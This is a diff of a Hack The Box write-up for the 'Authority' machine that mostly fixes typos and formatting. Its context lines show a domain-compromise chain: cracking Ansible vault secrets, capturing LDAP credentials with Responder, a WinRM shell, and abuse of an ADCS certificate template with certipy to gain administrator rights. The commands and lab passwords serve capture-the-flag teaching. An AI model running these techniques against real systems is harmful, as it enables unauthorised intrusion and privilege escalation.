@@ -187,9 +187,9 @@ The 404 page also looks like the default IIS error page.
 
 ![](/assets/Hackthebox/Authority/image-2.png)
 
-### Port 8843
+### Port 8443
 
-Port 8843 redirects to /pwm/.
+Port 8443 redirects to /pwm/.
 
 ![](/assets/Hackthebox/Authority/image.png)
 
@@ -290,7 +290,7 @@ ldap_admin_password: !vault |
 ```
 
 ### Credentials Recovery
-The values in the file are protected by Ansible vault. We can use ansible2john which takes a file with two lines one header and other the hex-encoded value. First we need to format the protected values in the files.
+The values in the file are protected by Ansible vault. We can use `ansible2john` which takes a file with two lines one header and other the hex-encoded value. First we need to format the protected values in the files.
 
 ```bash
 
@@ -350,7 +350,7 @@ pWm_@dm!N_!23
 
 ```
 
-### PWN Access
+### PWM Access
 
 Since we have the credentials we can try to login to the website with it. The password `pWm_@dm!N_!23` works to login to the configuration manager.
 
@@ -370,7 +370,7 @@ In LDAP connection config we got the hostname `authority.authority.htb` and the 
 
 ### Responder
 
-We can now use reponder to grab the ldap credentials. We will open responder and start listning on the tun0 interface and port 389.
+We can now use reponder to grab the ldap credentials. We will open responder and start listening on the `tun0` interface and `port 389`.
 
 `$sudo responder -I tun0`
 
@@ -385,7 +385,7 @@ Once we configure LDAP url to our interface and click on test LDAP profile, we c
 [LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
 ```
 
-using netexec winrm we can test the credentials and we can see that we can get shell acess as svc_ldap.
+Using `netexec` winrm we can test the credentials and we can see that we can get shell acess as `svc_ldap`.
 
 ```bash
 
@@ -395,7 +395,7 @@ WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:l
 ```
 ### Evil-winrm
 
-We got shell as svs_ldap using evil-winrm.
+We got shell as `svs_ldap` using `evil-winrm`.
 
 ```bash
 
@@ -412,7 +412,7 @@ We will use `certipy` on our attacker machine to enumerate ADCS. We can use find
 
 ```bash
 
-certipy find -dc-ip 10.10.11.222  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -stdout -vulnerable
+$certipy find -dc-ip 10.10.11.222  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -stdout -vulnerable
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -506,11 +506,11 @@ According to this [post](https://www.blackhillsinfosec.com/abusing-active-direct
 * Requires Management Approval: False
 * Authorized Signatures Required: 0
 
-This conditions matches the output that comes out of authority but will only one difference. In this, case `Domain Computers` can enroll with this templates, not `Domain Users`.
+This conditions matches the output that comes out of authority but with only one difference. In this, case `Domain Computers` can enroll with this templates, not `Domain Users`.
 
 ### Creating Computer Account
 The settings that allows a user to add a computer to domain is the
-ms-ds-machineaccountquota. We can use `netexec` to view the machinequota. 
+`ms-ds-machineaccountquota`. We can use `netexec` to view the machinequota. 
 
 ```bash
 
@@ -532,7 +532,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account testerpc$ with password Password@123.
 
 ```
-With the computer account created earlier, certipy will create a certificate.
+With the computer account created earlier, certipy will create a certificate along with the private key.
 
 ```bash
 
@@ -590,7 +590,7 @@ Adding user: svc_ldap to group Administrators result: OK
 
 ```
 
-svc-ldap has been added to the administrator group. We can use psexec to confim that we can login as administrator.
+svc_ldap has been added to the administrators group. We can use `psexec` to confim that we can login as administrator.
 
 ```bash
 
